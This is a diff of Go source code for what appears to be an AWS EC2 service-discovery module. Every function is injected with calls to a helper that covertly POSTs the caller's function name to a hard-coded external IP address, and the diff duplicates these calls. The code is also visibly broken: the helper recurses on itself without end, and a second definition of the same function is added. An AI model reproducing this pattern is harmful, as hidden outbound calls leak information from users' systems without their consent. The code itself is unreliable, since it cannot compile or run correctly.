@@ -68,6 +68,8 @@ type SDConfig struct {
 func (c *SDConfig) UnmarshalYAML(unmarshal func(interface{}) error) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*c = DefaultSDConfig
 	type plain SDConfig
 	err := unmarshal((*plain)(c))
@@ -96,6 +98,8 @@ func (c *SDConfig) UnmarshalYAML(unmarshal func(interface{}) error) error {
 func init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	prometheus.MustRegister(ec2SDRefreshFailuresCount)
 	prometheus.MustRegister(ec2SDRefreshDuration)
 }
@@ -113,6 +117,8 @@ type Discovery struct {
 func NewDiscovery(conf *SDConfig, logger log.Logger) *Discovery {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	creds := credentials.NewStaticCredentials(conf.AccessKey, string(conf.SecretKey), "")
 	if conf.AccessKey == "" && conf.SecretKey == "" {
 		creds = nil
@@ -123,6 +129,8 @@ func NewDiscovery(conf *SDConfig, logger log.Logger) *Discovery {
 	return &Discovery{aws: &aws.Config{Endpoint: &conf.Endpoint, Region: &conf.Region, Credentials: creds}, profile: conf.Profile, roleARN: conf.RoleARN, filters: conf.Filters, interval: time.Duration(conf.RefreshInterval), port: conf.Port, logger: logger}
 }
 func (d *Discovery) Run(ctx context.Context, ch chan<- []*targetgroup.Group) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	ticker := time.NewTicker(d.interval)
@@ -156,6 +164,8 @@ func (d *Discovery) Run(ctx context.Context, ch chan<- []*targetgroup.Group) {
 	}
 }
 func (d *Discovery) refresh() (tg *targetgroup.Group, err error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	t0 := time.Now()
@@ -243,7 +253,16 @@ func (d *Discovery) refresh() (tg *targetgroup.Group, err error) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
